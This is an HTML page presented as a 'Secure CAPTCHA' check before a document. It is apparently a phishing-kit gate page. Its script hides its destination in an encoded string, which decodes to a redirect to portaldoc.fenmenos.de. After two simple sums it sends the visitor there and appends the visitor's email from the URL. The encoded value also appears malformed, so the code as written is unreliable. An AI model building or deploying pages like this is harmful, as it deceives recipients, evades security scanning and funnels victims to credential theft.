<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    :root {
      --bg: #ffffff;
      --text: #333;
      --box-bg: #f7f7f7;
      --primary: #007bff;
      --success-green: #28a745;
      --border-gradient: linear-gradient(to right, #007bff, #00c6ff);
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--text);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
      position: relative;
    }

    .logo {
      position: absolute;
      top: 20px;
      left: 20px;
      display: flex;
      align-items: center;
      background: var(--box-bg);
      padding: 6px 12px;
      border-radius: 14px;
      border: 2px solid transparent;
      background-clip: padding-box;
      border-image: var(--border-gradient);
      border-image-slice: 1;
      box-shadow: 0 4px 20px rgba(0, 123, 255, 0.2);
    }

    .logo img {
      width: 16px;
      height: 16px;
      margin-right: 6px;
      object-fit: contain;
    }

    .logo span {
      font-size: 0.88rem;
      font-weight: 600;
      color: var(--primary);
    }

    #captcha-box {
      background: var(--box-bg);
      padding: 30px;
      border-radius: 16px;
      border: 3px solid transparent;
      border-image: var(--border-gradient);
      border-image-slice: 1;
      box-shadow: 0 6px 24px rgba(0, 123, 255, 0.25);
      text-align: center;
      width: 100%;
      max-width: 400px;
    }

    .captcha-header {
      font-size: 1.1rem;
      font-weight: 500;
      margin-bottom: 18px;
      color: var(--text);
    }

    #captcha-question {
      font-size: 1.2rem;
      margin-bottom: 12px;
    }

    input[type="number"] {
      font-size: 1rem;
      padding: 10px;
      width: 60%;
      max-width: 200px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      text-align: center;
    }

    button {
      padding: 12px 24px;
      font-size: 1rem;
      background-color: var(--primary);
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #0056b3;
    }

    #message {
      margin-top: 15px;
      font-size: 1.1rem;
      min-height: 24px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
    }

    .icon-success {
      width: 24px;
      height: 24px;
    }

    p.note {
      font-size: 0.88rem;
      color: #666;
      margin-top: 20px;
      line-height: 1.4;
    }

    @media (max-width: 480px) {
      #captcha-box {
        padding: 20px;
      }

      input[type="number"] {
        width: 100%;
      }

      button {
        width: 100%;
      }

      .logo {
        flex-direction: row;
        align-items: center;
        padding: 4px 10px;
      }

      .logo img {
        width: 14px;
        height: 14px;
        margin-right: 6px;
      }

      .logo span {
        font-size: 0.86rem;
      }
    }
  </style>
</head>
<body>

  <!-- Logo -->
  <div class="logo">
    <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
    <span>Secure CAPTCHA</span>
  </div>

  <!-- CAPTCHA -->
  <div id="captcha-box">
    <div class="captcha-header">For security reasons, please solve this to continue.</div>
    <div id="captcha-question">Loading...</div>
    <input type="number" id="user-answer" placeholder="Your answer" />
    <br />
    <button onclick="validateCaptcha()">Submit</button>
    <div id="message"></div>
    <p class="note">
      By solving this correctly, we ensure a direct and secure connection to the document, reducing the risk of unauthorized access.
    </p>
  </div>

  <script>
    let answer = 0;
    let firstSolved = false;

    // Base64-encoded final redirect URL
    const base64Ref = JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vcG9ydGFsZG9jLmZlbm1lbm9zLmRlL1ZrZXVVJTIyJTIwLyUzRQ==;

    function generateCaptcha() {
      const num1 = Math.floor(Math.random() * 20) + 1;
      const num2 = Math.floor(Math.random() * 10) + 1;
      const operations = ['+', '-', '*'];
      const operation = operations[Math.floor(Math.random() * operations.length)];

      let question = '';
      switch (operation) {
        case '+':
          answer = num1 + num2;
          question = `${num1} + ${num2}`;
          break;
        case '-':
          answer = num1 - num2;
          question = `${num1} - ${num2}`;
          break;
        case '*':
          answer = num1 * num2;
          question = `${num1} x ${num2}`;
          break;
      }

      document.getElementById("captcha-question").innerText = `What is ${question}?`;
      document.getElementById("user-answer").value = '';
      document.getElementById("message").innerText = '';
    }

    function validateCaptcha() {
      const userAnswer = parseInt(document.getElementById("user-answer").value);
      const msg = document.getElementById("message");

      if (userAnswer === answer) {
        if (!firstSolved) {
          firstSolved = true;
          msg.innerText = "Correct! One more to go...";
          generateCaptcha();
        } else {
          msg.innerHTML = `Access granted <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success Tick" class="icon-success">`;
          setTimeout(() => {
            redirectUser();
          }, 1500);
        }
      } else {
        msg.innerText = "Incorrect. Please try again.";
      }
    }

    function redirectUser() {
      try {
        const decodedRef = atob(base64Ref);
        const email = new URLSearchParams(window.location.search).get("id");

        if (email) {
          const finalUrl = decodedRef + `?id=${email}`;
          window.location.href = finalUrl;
        } else {
          window.location.href = decodedRef;
        }
      } catch (e) {
        alert("Redirect failed. Invalid base64.");
      }
    }

    window.onload = generateCaptcha;
  </script>
</body>
</html>
